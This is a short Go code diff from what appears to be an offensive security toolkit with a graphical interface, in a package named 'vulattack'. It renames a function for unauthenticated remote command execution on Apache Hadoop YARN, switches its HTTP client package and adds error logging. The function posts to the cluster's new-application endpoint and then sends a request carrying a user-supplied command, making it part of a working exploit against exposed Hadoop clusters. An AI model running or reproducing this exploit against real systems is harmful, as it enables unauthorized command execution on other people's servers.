@@ -3,18 +3,20 @@ package vulattack
 import (
 	"encoding/json"
 	"net/http"
-	"slack/common/proxy"
+	"slack/common/client"
+	"slack/common/logger"
 	"strings"
 
 	"fyne.io/fyne/v2/widget"
 )
 
-func HadoopUnauthRCE(target string, cmd string, result *widget.Entry) {
+func ApacheHadoopRCE(target string, cmd string, result *widget.Entry) {
 	target = strings.TrimSuffix(target, "/")
 	url := target + "/ws/v1/cluster/apps/new-application"
-	netClient := proxy.DefaultClient()
+	netClient := client.DefaultClient()
 	resp, err := netClient.Post(url, "application/json", nil)
 	if err != nil {
+		logger.Error(err)
 		result.SetText("Failed to send request\n")
 		return
 	}
@@ -43,6 +45,7 @@ func HadoopUnauthRCE(target string, cmd string, result *widget.Entry) {
 	req.Header.Set("Content-Type", "application/json")
 	_, err = netClient.Do(req)
 	if err != nil {
+		logger.Error(err)
 		result.SetText("Failed to send request")
 		return
 	}
